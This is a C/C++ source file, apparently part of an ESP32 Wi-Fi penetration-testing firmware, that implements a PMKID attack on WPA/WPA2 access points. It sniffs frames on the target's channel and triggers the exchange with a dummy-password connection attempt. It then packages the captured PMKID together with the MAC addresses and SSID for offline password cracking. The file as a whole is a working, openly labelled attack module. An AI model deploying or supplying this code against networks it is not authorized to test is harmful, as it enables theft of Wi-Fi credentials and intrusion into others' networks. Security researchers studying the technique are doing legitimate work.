/**
 * @file attack_pmkid.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements PMKID attack.
 * 
 * @see PMKID attack reference - https://hashcat.net/forum/thread-7717.html
 */

#include "main/attack_pmkid.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "main/attack.h"
#include "components/wifi_controller/wifi_controller.h"
#include "components/frame_analyzer/frame_analyzer_parser.h"
#include "components/frame_analyzer/frame_analyzer_types.h"
#include "components/system_manager.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * If DATA_FRAME_EVENT_PMKID is received from event pool, this function stops PMKID attack and serialize 
 * captured PMKIDs into status content.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_PMKID
 * @param event_data expexcts pmkid_item_t *
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID, stopping attack...");
    attack_update_status(FINISHED);
    attack_pmkid_stop();
    
    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    // count how many PMKIDs in the list
    pmkid_item_t *pmkid_item = pmkid_item_head;
    unsigned pmkid_item_count = 1; 
    while((pmkid_item = pmkid_item->next) != NULL){
        pmkid_item_count++;
    }

    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
    char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
    SystemManager::getInstance().wificontrollerInterface->wifictl_get_sta_mac((uint8_t *) content);
    content += 6;
    memcpy(content, ap_record->bssid, 6);
    content += 6;
    content[0] = strlen((char *) ap_record->ssid);
    content += 1;
    strcpy(content, (char *) ap_record->ssid);
    content += strlen((char *) ap_record->ssid);

    // copy PMKIDs into continuous memory into "content" in status 
    pmkid_item = pmkid_item_head;
    do {
        pmkid_item_head = pmkid_item;
        memcpy(content, pmkid_item_head, 16);
        content += 16;
        pmkid_item = pmkid_item->next;
        free(pmkid_item_head);
    } while(pmkid_item != NULL);

    ESP_LOGD(TAG, "PMKID attack finished");
}

void attack_pmkid_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting PMKID attack...");
    ap_record = attack_config->ap_record;
    SystemManager::getInstance().wificontrollerInterface->wifictl_sniffer_filter_frame_types(true, false, false);
    SystemManager::getInstance().wificontrollerInterface->wifictl_sniffer_start(ap_record->primary);
    SystemManager::getInstance().frameAnalyzerInterface->capture_start(SEARCH_PMKID, ap_record->bssid);
    SystemManager::getInstance().wificontrollerInterface->wifictl_sta_connect_to_ap(ap_record, "dummypassword");
    esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL);
}

void attack_pmkid_stop(){
    SystemManager::getInstance().wificontrollerInterface->wifictl_sta_disconnect();
    SystemManager::getInstance().wificontrollerInterface->wifictl_sniffer_stop();
    SystemManager::getInstance().frameAnalyzerInterface->capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_condition_handler));
    ESP_LOGD(TAG, "PMKID attack stopped");
}
